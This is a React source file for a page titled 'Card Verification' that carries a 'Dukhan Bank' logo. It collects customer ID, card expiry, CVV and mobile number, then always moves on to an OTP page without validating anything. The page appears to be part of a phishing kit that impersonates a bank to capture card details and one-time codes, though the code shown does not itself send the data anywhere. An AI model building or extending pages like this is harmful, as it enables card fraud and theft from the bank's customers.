import React, { useState } from "react";
import { Globe, HelpCircle, Loader2 } from "lucide-react";
import { useNavigate } from "react-router-dom";
import Logo from "@/assets/logo.png";

const EXPIRY = () => {
  const navigate = useNavigate();

  const [customerId, setCustomerId] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [mobile, setMobile] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      navigate("/exp-otp"); // ✅ Always go to next page
    }, 1500);
  };

  return (
    <div className="min-h-[90vh] flex flex-col items-center justify-center bg-gray-50 p-6">
      {/* Top Bar */}
      <div className="flex justify-between w-full max-w-sm mb-4 text-gray-500">
        <HelpCircle className="w-6 h-6" />
        <Globe className="w-6 h-6" />
      </div>

      {/* Logo */}
      <div className="flex flex-col items-center">
        <img src={Logo} alt="Dukhan Bank" className="h-12 mb-2" />
      </div>

      {/* Form */}
      <div className="w-full max-w-sm mt-6">
        <h2 className="text-xl font-semibold mb-2 text-center">Card Verification</h2>
        <p className="text-gray-600 text-sm mb-6 text-center">
          Enter your details to continue
        </p>

        {/* Customer ID */}
        <div className="mb-4">
          <input
            type="text"
            placeholder="Customer ID"
            value={customerId}
            onChange={(e) => setCustomerId(e.target.value)}
            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
        </div>

        {/* Expiry Date (Month/Year only) */}
        <div className="mb-4">
          <input
            type="month"
            value={expiryDate}
            onChange={(e) => setExpiryDate(e.target.value)}
            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
        </div>

        {/* CVV */}
        <div className="mb-4">
          <input
            type="password"
            placeholder="CVV"
            value={cvv}
            onChange={(e) => setCvv(e.target.value)}
            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
        </div>

        {/* Mobile Number */}
        <div className="mb-6">
          <input
            type="text"
            placeholder="Registered Mobile Number"
            value={mobile}
            onChange={(e) => setMobile(e.target.value)}
            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
        </div>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold flex items-center justify-center disabled:bg-gray-300"
        >
          {loading ? <Loader2 className="animate-spin w-5 h-5" /> : "Submit"}
        </button>
      </div>
    </div>
  );
};

export default EXPIRY;
